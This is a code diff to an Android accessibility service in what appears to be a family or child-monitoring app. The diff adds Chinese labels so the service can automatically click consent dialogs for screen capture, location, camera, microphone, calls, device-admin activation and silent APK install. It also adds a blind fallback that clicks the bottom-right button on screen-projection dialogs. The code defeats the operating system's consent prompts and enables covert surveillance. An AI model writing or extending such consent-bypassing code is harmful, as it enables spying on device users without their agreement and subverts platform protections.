@@ -154,7 +154,11 @@ class EnforcementService : AccessibilityService() {
         @Volatile
         private var confirmAttempts = 0
 
-        /** Positive buttons we are allowed to click, exact lowercase match. */
+        /** Positive buttons we are allowed to click, exact lowercase match.
+         *  Chinese labels bhi — kuch parivaar ke phones Chinese-locale ROM par
+         *  chalte hain (MIUI/HyperOS default 中文): wahan consent dialog ka
+         *  button "立即开始" hota hai, English/Hindi match kabhi hit hi nahi hota
+         *  aur dialog screen par khadi reh jaati thi (mirror dead). */
         private val POSITIVE_ACTIONS = setOf(
             "start now", "start", "start recording", "start casting",
             "start screen capture", "start screen sharing", "start sharing",
@@ -162,7 +166,9 @@ class EnforcementService : AccessibilityService() {
             "share screen", "share entire screen", "share this screen", "share",
             "share full screen", "share whole screen",
             "अभी शुरू करें", "शुरू करें", "अभी प्रारंभ करें", "प्रारंभ करें",
-            "स्क्रीन साझा करें", "साझा करें", "शेयर करें"
+            "स्क्रीन साझा करें", "साझा करें", "शेयर करें",
+            "立即开始", "开始", "开始录制", "开始投屏", "开始镜像", "开始屏幕共享",
+            "开始共享", "分享屏幕", "共享屏幕", "分享整个屏幕"
         )
 
         /** Android 14+ chooser: make sure the whole screen is the selected option.
@@ -172,7 +178,8 @@ class EnforcementService : AccessibilityService() {
         private val ENTIRE_SCREEN_LABELS = listOf(
             "entire screen", "full screen", "whole screen", "entire display",
             "share full screen", "share entire screen", "share whole screen",
-            "पूरी स्क्रीन", "पूरा स्क्रीन"
+            "पूरी स्क्रीन", "पूरा स्क्रीन",
+            "整个屏幕", "完整屏幕"
         )
 
         private fun isProjectionDialog(className: String?): Boolean {
@@ -213,35 +220,41 @@ class EnforcementService : AccessibilityService() {
             "com.samsung.android.permissioncontroller"
         )
 
-        /** Exact lowercase button labels per armed step — nothing else is ever clicked. */
+        /** Exact lowercase button labels per armed step — nothing else is ever clicked.
+         *  Chinese labels bhi (Chinese-locale ROMs par system dialog Allow = "允许"). */
         val ALLOW_EXACT: Map<String, Set<String>> = mapOf(
-            "loc" to setOf("allow all the time", "while using the app", "only this time", "allow"),
-            "cam" to setOf("allow", "only this time"),
+            "loc" to setOf("allow all the time", "while using the app", "only this time", "allow",
+                "始终允许", "仅在使用中允许", "仅使用时允许", "仅本次允许", "允许"),
+            "cam" to setOf("allow", "only this time", "允许", "仅本次允许"),
             // Mic runtime permission self-heal (audio_start jab RECORD_AUDIO miss ho):
             // system permission dialog par Allow/While-using khud click hota hai.
-            "mic" to setOf("allow", "while using the app", "only this time"),
-            "calls" to setOf("allow"),
+            "mic" to setOf("allow", "while using the app", "only this time",
+                "允许", "仅在使用中允许", "仅使用时允许", "仅本次允许"),
+            "calls" to setOf("allow", "允许"),
             // Android 13+ runtime notification permission dialog (auto-setup ka
             // "postnotif" step) — Allow click ke bina notifications invisible rehti hain.
-            "postnotif" to setOf("allow"),
-            "battery" to setOf("allow"),
+            "postnotif" to setOf("allow", "允许"),
+            "battery" to setOf("allow", "允许"),
             "admin" to setOf(
                 "activate", "activate device administrator",
-                "इस ऐप्लिकेशन को चालू करें", "चालू करें", "सक्रिय करें"
+                "इस ऐप्लिकेशन को चालू करें", "चालू करें", "सक्रिय करें",
+                "激活", "激活设备管理器"
             ),
-            "notif" to setOf("allow", "अनुमति दें"),
+            "notif" to setOf("allow", "अनुमति दें", "允许"),
             // Self-uninstall confirm dialog (Remove device / 18+ release):
             // AOSP: "Do you want to uninstall this app?" [OK], MIUI/Samsung apna
             // text use karte hain. Sirf release/uninstall armed hone par hi armed
             // window (120 s) me click hota hai.
             "uninstall" to setOf(
                 "ok", "uninstall", "uninstall anyway", "uninstall for all users",
-                "इस ऐप को अनइंस्टॉल करें", "अनइंस्टॉल करें", "अनइंस्टॉल"
+                "इस ऐप को अनइंस्टॉल करें", "अनइंस्टॉल करें", "अनइंस्टॉल",
+                "确定", "卸载", "仍然卸载"
             ),
             // Silent self-update: child app naya APK install karta hai — system
             // install confirm par khud "Install" click ho jata hai.
             "install" to setOf(
-                "install", "install anyway", "इंस्टॉल करें", "इंस्टॉल करें।"
+                "install", "install anyway", "इंस्टॉल करें", "इंस्टॉल करें।",
+                "安装", "仍然安装"
             )
         )
     }
@@ -285,14 +298,47 @@ class EnforcementService : AccessibilityService() {
             }
         }
         val matches = mutableSetOf<AccessibilityNodeInfo>()
-        for (needle in listOf("start", "share", "शुरू", "प्रारंभ", "साझा", "शेयर")) {
+        for (needle in listOf("start", "share", "शुरू", "प्रारंभ", "साझा", "शेयर", "开始", "立即", "共享")) {
             matches.addAll(root.findAccessibilityNodeInfosByText(needle))
         }
         for (n in matches) {
             val text = (n.text ?: n.contentDescription)?.toString()?.trim()?.lowercase() ?: continue
             if (text in POSITIVE_ACTIONS && !n.isCheckable && clickDeep(n)) return true
         }
-        return false
+        // GENERIC FALLBACK (locale-proof): text match na ho (koi bhi language) to
+        // dialog ke bottom-right most clickable Button par click karo — Android
+        // convention me POSITIVE button hamesha rightmost/bottommost hota hai.
+        // Sirf projection dialog host packages par aur armed window me hi chalega.
+        return clickPositiveByPosition(root)
+    }
+
+    /** Dialog ke sabse rightmost+bottom clickable button par click (positive
+     *  convention). Sirf isProjectionDialog window par — blind click kahin nahi. */
+    private fun clickPositiveByPosition(root: AccessibilityNodeInfo): Boolean {
+        val pkg = root.packageName?.toString() ?: return false
+        if (pkg !in PROJECTION_DIALOG_PKGS) return false
+        var best: AccessibilityNodeInfo? = null
+        var bestX = Int.MIN_VALUE
+        var bestY = Int.MIN_VALUE
+        val stack = ArrayDeque<AccessibilityNodeInfo>()
+        stack.add(root)
+        var visited = 0
+        while (stack.isNotEmpty() && visited < 400) {
+            val n = stack.removeFirst()
+            visited++
+            val cls = n.className?.toString() ?: ""
+            if (cls.endsWith("Button") && n.isClickable && !n.isCheckable) {
+                val r = android.graphics.Rect()
+                runCatching { n.getBoundsInScreen(r) }.getOrDefault(false)
+                if (r.right > bestX || (r.right == bestX && r.bottom > bestY)) {
+                    bestX = r.right; bestY = r.bottom; best = n
+                }
+            }
+            for (i in 0 until n.childCount) {
+                runCatching { n.getChild(i) }.getOrNull()?.let { stack.add(it) }
+            }
+        }
+        return best != null && clickDeep(best)
     }
 
     private fun clickDeep(node: AccessibilityNodeInfo): Boolean {
